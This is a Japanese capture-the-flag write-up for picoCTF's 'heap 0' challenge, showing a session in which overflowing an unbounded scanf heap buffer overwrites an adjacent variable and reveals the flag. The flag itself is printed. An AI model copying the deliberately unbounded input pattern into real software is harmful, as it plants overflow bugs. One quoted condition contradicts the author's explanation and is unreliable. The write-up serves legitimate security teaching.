# heap 0:Binary Exploitation
Are overflows just a stack concern? Download the binary here. Download the source here. Connect with the challenge instance here: nc tethys.picoctf.net 61024

attachment
chall
chal.c

# Solution
とりあえず、`nc tethys.picoctf.net 61024`を実行してみる。
```
$ nc tethys.picoctf.net 61024

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x565ae0abb2b0  ->   pico
+-------------+----------------+
[*]   0x565ae0abb2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:
```
選択肢が用意されていて、数字を入力するとそれに対応したことができるらしい。`2. Write to buffer: (write to your own personal block of data on the heap)`これを選ぶと、バッファをいじれそうなので、とりあえずオーバーフローを試みる。

```
Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_c3935a08}
```
フラグが得られた。

`picoCTF{my_first_heap_overflow_c3935a08}`

ちなみに、ソースコードを見てみると、
```c
if (!strcmp(safe_var, "pico")) {
    printf("\nYOU WIN\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
```
という記述があり、safe_varがpicoと一致しなければフラグが得られるようになっていた。
```c
input_data = malloc(INPUT_DATA_SIZE);
strncpy(input_data, "pico", INPUT_DATA_SIZE);
safe_var = malloc(SAFE_VAR_SIZE);
strncpy(safe_var, "bico", SAFE_VAR_SIZE);
```
safe_varはinput_dataのすぐ後に領域が確保されていた。
```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```
バッファ(input_data)への書き込みはscanfで行われ、文字数制限は行われていない。
```
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x565ae0abb2b0  ->   pico
+-------------+----------------+
[*]   0x565ae0abb2d0  ->   bico
+-------------+----------------+
```
上記、アドレス値よりinput_dataとsafe_varには0x20の差があり、入力文字の33文字目からsafe_varに書き込まれるようになっている。よって、バッファに33文字以上書き込めばフラグが得られる。
